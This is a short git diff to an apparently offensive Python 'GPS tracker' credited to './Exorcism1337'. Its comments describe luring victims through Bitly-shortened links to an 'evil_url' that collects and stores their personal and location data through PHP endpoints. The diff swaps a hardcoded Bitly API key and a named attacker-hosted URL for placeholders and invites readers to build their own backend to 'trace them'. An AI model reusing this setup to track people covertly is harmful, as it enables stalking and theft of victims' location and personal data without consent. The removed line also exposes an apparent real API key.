@@ -1,4 +1,6 @@
 # GPS TRACKER CODED BY ./Exorcism1337
+# This is my personal tools
+# code your own backend to trace them :p
 import sys
 import time
 import random
@@ -16,9 +18,9 @@ class Exorcism1337:
     # apiv4 is a default url shortener from bitly , because apiv3 is deprecated!
     # tracked victim is the path for the program will write the victim personal data
 
-    api_key = "7a2d2f63d75895d7763f5b30f6102136f587a3b9"
+    api_key = "YOUR_API_KEY"
     apiv4 = "https://api-ssl.bitly.com/v4/bitlinks"
-    evil_url = "https://pwnzme1337.000webhostapp.com/"
+    evil_url = "YOUR_EVIL_URL"
     tracked_victim = evil_url + "tracked_victim/"
     getDetail = evil_url + "getDetail.php"
     updateDetail = evil_url + "updateDetail.php"
